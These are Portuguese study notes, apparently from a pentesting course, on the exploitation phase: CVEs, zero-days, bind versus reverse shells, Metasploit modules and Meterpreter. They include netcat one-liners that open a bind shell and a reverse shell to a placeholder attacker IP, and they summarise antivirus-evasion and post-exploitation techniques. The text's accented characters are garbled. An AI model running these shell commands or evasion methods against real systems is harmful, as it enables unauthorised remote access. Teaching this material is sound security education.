# Explotation

Explora as vunerabilidade encontradas, enviando um playload para a m√°quina alvo.
- Priorizamos a explora√ß√£o pela criticidade das vunerabilidades
- Um playload pode ser um programa ou uma shell
  - A shell conecta a m√°quina alvo permite executar comandos na m√°quiona alvo

Algumas vezes n√£o s√£o encontradas vunerabilidades que possam ser exploradas. Cintudo, isso n√£o indica que n√£o possam ocorres ataques exitosos. Nesses casos, o playload √© carregado atrav√©s de engenharia social.


**Sobre vunerabilidades:**
- CVE (Common Vulnerabilities and Exposures)
  - refer√™ncia universal para que fabricantes, pesquisadores e empresas falem a mesma ‚Äúl√≠ngua‚Äù quando tratam de vulnerabilidades.
  - Formato: CVE-ANO-N√öMERO
    - Exemplo: CVE-2017-0144 (EternalBlue, usado no ataque WannaCry).
- Zero-day vulnerability: falha de seguran√ßa desconhecida pelo fabricante ou pela comunidade de seguran√ßa.
  - N√£o documentada publicamente ‚Äì n√£o existe CVE ou alerta oficial ainda.
  - N√£o tem corre√ß√£o ‚Äì os fabricantes e usu√°rios n√£o podem se proteger com patch.
  - Alvo preferido de cibercriminosos e governos ‚Äì porque √© extremamente dif√≠cil de detectar e defender.
  - Alto valor de mercado ‚Äì exploits 0-day podem ser vendidos em mercados clandestinos (ou at√© mesmo para ag√™ncias governamentais).
  - Zero-day exploit: √© o c√≥digo ou t√©cnica que explora essa falha antes que exista um patch/corre√ß√£o dispon√≠vel.
- A vunerabilidade nem sempre √© t√©cnica, pode ser tamb√©m pessoas que utilizem uma rede.
  - A maioria dos ataques s√£o de explora√ß√£o de vunerabilidades de pessoas.

A principal ferramenta utilizada durante o explotation √© o **metasploit framework**.

## Reverse Shell e Bind Shell

### **Bind Shell**

* O atacante faz com que a m√°quina-alvo **abra uma porta e ‚Äúescute‚Äù conex√µes externas**.
* O atacante ent√£o se conecta diretamente a essa porta para obter acesso.
* **Fluxo:**
  * V√≠tima ‚Üí abre porta (servidor)
  * Atacante ‚Üí conecta na porta (cliente)
* Exemplo:
```
# Na v√≠tima
nc -lvp 4444 -e /bin/bash   # abre uma shell e espera conex√£o

# No atacante
nc <IP_da_v√≠tima> 4444
```

### **Reverse Shell**

* Ao inv√©s de escutar, a v√≠tima **abre uma conex√£o de sa√≠da** para o atacante.
* Muito usado em ambientes protegidos por firewall, onde a m√°quina n√£o aceita conex√µes externas, mas **pode sair para fora (outbound)**.
* **Fluxo:**
  * Atacante ‚Üí escuta em uma porta
  * V√≠tima ‚Üí conecta no atacante e envia a shell
* Exemplo:
```
# No atacante
nc -lvp 4444   # escuta esperando a shell

# Na v√≠tima
nc <IP_do_atacante> 4444 -e /bin/bash
```

### Compara√ß√£o

| Caracter√≠stica      | Bind Shell üñ•Ô∏è‚û°Ô∏è    | Reverse Shell ‚¨ÖÔ∏èüñ•Ô∏è                |
| ------------------- | ------------------- | ---------------------------------- |
| Quem abre a porta?  | V√≠tima (servidor)   | Atacante (servidor)                |
| Quem conecta?       | Atacante            | V√≠tima                             |
| Mais f√°cil em‚Ä¶      | Rede sem firewall   | Rede com firewall (sa√≠da liberada) |
| Risco para atacante | IP e porta expostos | Atacante fica oculto (escutando)   |

## Metasploit framework

O **Metasploit Framework (MSF)** √© uma **plataforma de c√≥digo aberto** usada para:
* **Desenvolver**
* **Testar**
* **Executar**
**explora√ß√µes (exploits) de vulnerabilidades** em sistemas e aplica√ß√µes. Resumindo √© um kit completo para explora√ß√£o de vulnerabilidades, e um dos principais **frameworks de pentest e ethical hacking** do mundo.

### M√≥dulos principais

S√£o scripts em Ruby que interagem com o pr√≥prio Metasploit para executar alguma tarefa espec√≠fica. 

#### 1 - **Exploits**

Ele n√£o √© a ‚Äúcarga‚Äù em si (isso √© o **payload**), nem a ‚Äúmaquiagem‚Äù (**encoder**), mas sim a **ferramenta que abre a brecha** explorando uma vulnerabilidade para permitir a execu√ß√£o do payload.

Respons√°vel por:
1. **Aproveitar uma vulnerabilidade** em um software, servi√ßo ou sistema operacional.
2. **Entregar o payload** escolhido pelo pentester.
   * O exploit cria a ‚Äúporta de entrada‚Äù e injeta o **payload** (que pode ser um reverse shell, meterpreter, cria√ß√£o de usu√°rio, etc.).
3. **Executar a carga maliciosa** na m√°quina alvo.
   * Se o exploit funcionar, o payload ser√° executado com os privil√©gios do processo atacado (√†s vezes at√© administrador/root).

Cada exploit do Metasploit √© um script Ruby que inclui:
* **Informa√ß√µes da vulnerabilidade** (CVE, autor, plataforma afetada, refer√™ncia t√©cnica).
* **M√©todo de explora√ß√£o** (como acionar a falha).
* **Alvos suportados** (vers√µes de SO, servi√ßos, arquiteturas).
* **Compatibilidade com payloads** (quais tipos podem ser entregues).

#### 2 - **Payloads**

O **payload** √© a **carga √∫til** que ser√° executada **depois que o exploit consegue explorar a vulnerabilidade**. 

Funciona em conjunto com o **exploit**: sem exploit, o payload n√£o entra; sem payload, o exploit n√£o serve para nada.

Em outras palavras:
* O **exploit** abre a porta (usa a falha).
* O **payload** √© o que passa por essa porta (o c√≥digo que o atacante realmente quer rodar).

**Tipos de Payloads:**
1. **Singles**
   * Cont√™m todo o c√≥digo em um √∫nico m√≥dulo.
   * Exemplo: abrir um shell simples.
   * R√°pidos e diretos, mas limitados.
2. **Stagers**
   * Pequenos payloads iniciais que **preparam o terreno** (criam a conex√£o com o atacante).
   * Servem para carregar payloads maiores.
   * Exemplo: `reverse_tcp` que s√≥ abre a conex√£o.
3. **Stages**
   * S√£o os payloads maiores que v√™m depois do *stager*.
   * Exemplo: `meterpreter`, que oferece uma shell interativa completa com fun√ß√µes extras.

#### 3 - **Auxiliary**

Serve para executar **fun√ß√µes auxiliares** que **n√£o envolvem explora√ß√£o direta** de vulnerabilidades.

Usado principalmente para:
1. **Reconhecimento e varredura (scanning)**
2. **Enumera√ß√£o de servi√ßos e usu√°rios**
3. **For√ßa bruta (bruteforce)**
4. **Fuzzing** (testar entradas inv√°lidas para achar falhas)
5. **Nega√ß√£o de servi√ßo (DoS)**
6. Outras a√ß√µes de suporte que ajudam antes ou depois de explorar.

#### 4 - *Post**

O m√≥dulo **post** (ou p√≥s-exploitation) √© usado **ap√≥s obter acesso ao sistema alvo**. Serve para **coletar informa√ß√µes, manter persist√™ncia e expandir privil√©gios ou movimento lateral**. S√≥ funciona **quando j√° existe uma sess√£o ativa** (shell ou meterpreter) no alvo.

**O que d√° para fazer com m√≥dulos post?**

1. **Coleta de informa√ß√µes (gathering)**
2. **Escalada de privil√©gios (privilege escalation)**
   * Tentar virar administrador/root no sistema comprometido.
3. **Movimenta√ß√£o lateral**
   * Usar credenciais coletadas para invadir outras m√°quinas na rede.
4. **Persist√™ncia**
   * Instalar backdoors para manter acesso mesmo ap√≥s reboot.
5. **Exfiltra√ß√£o**
   * Copiar arquivos, capturar teclas (*keylogger*), tirar screenshots.

#### 5 - *Encoders**

M√≥dulo que **transforma o payload** (o c√≥digo que ser√° executado na m√°quina alvo) para que ele:

1. **Evite detec√ß√£o por antiv√≠rus (AV), IDS/IPS e EDR**
   * Antiv√≠rus geralmente trabalham com *assinaturas conhecidas*.
   * O encoder muda a ‚Äúcara‚Äù do payload sem mudar sua fun√ß√£o.
2. **Evite caracteres inv√°lidos**
   * Em certos exploits, n√£o √© poss√≠vel enviar alguns caracteres (exemplo: `\x00` ou `\x0a`).
   * O encoder reescreve o payload para que funcione sem esses bytes proibidos.
3. **Obfusca√ß√£o**
   * Serve para deixar o payload menos leg√≠vel, dificultando an√°lise est√°tica.

**Funcionamento:**
* O payload √© **codificado** com um algoritmo de transforma√ß√£o (ex: XOR, base64-like, etc.).
* Um **stub de decodifica√ß√£o** √© inclu√≠do junto.
* Quando o payload roda na v√≠tima, o stub **decodifica** o shellcode de volta √† forma original e o executa.

**Limita√ß√µes:**
* Encoders **n√£o garantem bypass 100%** de antiv√≠rus modernos (que usam heur√≠stica e comportamento).
* Em ambientes atuais, ferramentas de defesa conseguem detectar mesmo payloads encodados.
* Hoje, usam-se t√©cnicas mais avan√ßadas de **evasion** (outro m√≥dulo do Metasploit, bem mais poderoso que encoder).

#### 6 - **Evasion**

Usado para **criar cargas maliciosas (payloads) modificadas**, capazes de:
1. **Driblar antiv√≠rus (AV)**
2. **Evitar detec√ß√£o por IDS/IPS/EDR**
3. **Disfar√ßar a execu√ß√£o do exploit/payload**

üëâ Ele √© mais avan√ßado que o **encoder** (que s√≥ muda a forma do payload). Enquanto o encoder faz ‚Äúobfusca√ß√£o simples‚Äù, o **evasion** aplica **t√©cnicas ativas de bypass de seguran√ßa**.

**T√©cnicas comuns de evas√£o:**
* **Polimorfismo** ‚Üí muda constantemente a apar√™ncia do c√≥digo.
* **Ofusca√ß√£o de c√≥digo** ‚Üí insere lixo/instru√ß√µes in√∫teis para confundir assinaturas.
* **Packing** ‚Üí comprime e embaralha o payload.
* **Uso de APIs leg√≠timas** ‚Üí para misturar o malicioso com fun√ß√µes comuns do sistema.
* **Execu√ß√£o em mem√≥ria** ‚Üí evita gravar arquivos suspeitos em disco.

**Diferen√ßa entre encoder e evasion**

| Caracter√≠stica    | Encoder üé≠                      | Evasion üïµÔ∏è                                |
| ----------------- | ------------------------------- | ------------------------------------------ |
| Objetivo          | Obfuscar payload (mudar ‚Äúcara‚Äù) | Bypassar ativamente AV/EDR                 |
| N√≠vel de prote√ß√£o | Simples (assinaturas)           | Mais avan√ßado (heur√≠stica e comportamento) |
| Exemplo cl√°ssico  | `x86/shikata_ga_nai`            | `windows/windows_defender_exe`             |

#### 6 - **Nops**

O m√≥dulo **nop** gera instru√ß√µes chamadas de **No Operation** (NOPs). Elas **n√£o executam nenhuma a√ß√£o √∫til** no processador al√©m de ‚Äún√£o fazer nada‚Äù e seguir para a pr√≥xima instru√ß√£o.

No contexto de explora√ß√£o, NOPs s√£o usados para:
  1. **Preencher espa√ßo** em um shellcode.
  2. **Criar NOP sleds**, que aumentam a chance de o exploit ‚Äúcair‚Äù corretamente no payload.

üëâ Resumindo: o m√≥dulo **nop** √© como um **‚Äúcolch√£o de instru√ß√µes vazias‚Äù** para facilitar a execu√ß√£o do payload.

Em ataques como **buffer overflow**, o atacante precisa acertar o **endere√ßo de mem√≥ria exato** onde o payload foi injetado.
* Se errar por alguns bytes ‚Üí falha.
* Se houver um **NOP sled** (sequ√™ncia de NOPs antes do payload), qualquer salto que cair em qualquer ponto do sled **escorregar√° at√© o shellcode**.

O m√≥dulo **nop** do Metasploit √© usado para **gerar instru√ß√µes NOP (No Operation)** que servem de **colch√£o de seguran√ßa em ataques de buffer overflow**, ajudando o payload a ser executado corretamente mesmo quando o endere√ßo exato n√£o √© atingido.

### Meterpreter

O **Meterpreter** √© um **payload avan√ßado** do Metasploit Framework.
* Fornece ao atacante uma **shell interativa**, carregada inteiramente **na mem√≥ria** (sem gravar nada em disco, o que ajuda a evitar antiv√≠rus).
* Diferente de um shell simples, o Meterpreter tem **diversos comandos extras** para p√≥s-explora√ß√£o.
üëâ Em resumo: o Meterpreter √© **o ‚Äúcanivete su√≠√ßo‚Äù do pentester dentro da m√°quina comprometida**.

**Caracter√≠sticas principais:**

1. **Carregado em mem√≥ria** ‚Üí n√£o deixa rastros no disco.
2. **Modular** ‚Üí voc√™ pode carregar/extender fun√ß√µes conforme necess√°rio.
3. **Comunica√ß√£o criptografada** ‚Üí dificulta detec√ß√£o.
4. **Invisibilidade** ‚Üí roda como parte de um processo existente da v√≠tima.

**O que d√° para fazer com Meterpreter:**

* **Controle remoto da m√°quina**:
  * Executar comandos do sistema.
  * Explorar o sistema de arquivos (upload/download).
* **Coleta de informa√ß√µes**:
  * Hashdump (pegar senhas).
  * Informa√ß√µes de rede e processos.
* **Monitoramento**:
  * Keylogger.
  * Captura de tela (*screenshot*).
  * Webcam snap (foto pela c√¢mera).
* **Movimenta√ß√£o lateral**:
  * Pivoting (usar a m√°quina comprometida como ponte para atacar outras).
* **Persist√™ncia**:
  * Criar backdoors para manter acesso.
